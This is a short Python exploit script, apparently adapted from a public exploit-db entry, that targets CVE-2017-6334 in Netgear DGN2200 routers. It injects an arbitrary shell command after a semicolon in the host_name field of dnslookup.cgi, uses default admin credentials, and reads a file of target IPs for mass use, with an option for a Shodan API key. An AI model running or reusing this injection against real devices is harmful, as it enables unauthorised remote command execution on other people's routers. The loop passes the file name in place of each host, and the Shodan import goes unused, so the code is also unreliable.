import sys
import requests
import argparse
import shodan




def fuzz(cmd,host,login,password):
    requests.post("http://" + host + "/dnslookup.cgi",
                  data={'host_name': "www.google.com; " + cmd, 'lookup': "Lookup"}, auth=(login, password))


def assign_args():
    global flags

    if not len(sys.argv[1:]):
        art = """

    ███████╗██╗   ██╗███████╗███████╗██╗   ██╗██████╗ ██████╗ ██╗ ██████╗██╗  ██╗
    ██╔════╝██║   ██║╚══███╔╝╚══███╔╝╚██╗ ██╔╝██╔══██╗██╔══██╗██║██╔════╝██║ ██╔╝
    █████╗  ██║   ██║  ███╔╝   ███╔╝  ╚████╔╝ ██████╔╝██████╔╝██║██║     █████╔╝ 
    ██╔══╝  ██║   ██║ ███╔╝   ███╔╝    ╚██╔╝  ██╔══██╗██╔══██╗██║██║     ██╔═██╗ 
    ██║     ╚██████╔╝███████╗███████╗   ██║   ██████╔╝██║  ██║██║╚██████╗██║  ██╗
    ╚═╝      ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝ v1.0
                                                                                 
    Discover actual vulnerable Netgear DGN2200 devices!
          CVE-2017-6334 
          NETGEAR DGN2200v1/v2/v3/v4
          Remote Command Execution (dnslookup.cgi)
    
    Source:
    https://www.exploit-db.com/exploits/41459/
    
    Adapted By: 
    MidnightSeer
    
"""
        print(art)
        print("Help: -h or --help to view the help menu")
        sys.exit(0)
    else:

        parser = argparse.ArgumentParser(description="Netgear Fuzzer",
                                         formatter_class=argparse.RawDescriptionHelpFormatter,
                                         epilog='''Examples:
                {} --hostfile -u 'admin' -p 'admin' --cmd 'ls'
                
                By Default: 
                
                Username    - admin
                Password    - password
                Cmd         - ls
                '''.format(sys.argv[0]))

        parser.add_argument('--hostfile', action='store', dest='tgt_file',type=str, required=True, help='List of IPs')
        parser.add_argument('-u','--username', action='store', dest='username', type=str, required=True,
                            help='Username to log in as',default="admin")
        parser.add_argument('-p','--password', action='store', dest='password', type=str, required=True,
                            help='Password to log in with', default="password")
        parser.add_argument('--cmd',action='store', dest='cmd', type=str, required=True,
                            help='Command to Test Injection', default="ls")
        parser.add_argument('--shodan-api-key', action='store', dest='api_key', type=str,
                            help="Shodan API key, it's free!!")
        return parser.parse_args()

def main(args):
    try:
        with open(args.tgt_file) as file:
            for host in file:
                fuzz(args.cmd, args.tgt_file, args.username, args.password)
    except FileNotFoundError:
        print("[!] File does not exist")
        sys.exit()


if __name__ == '__main__':
    args = assign_args()
    main(args)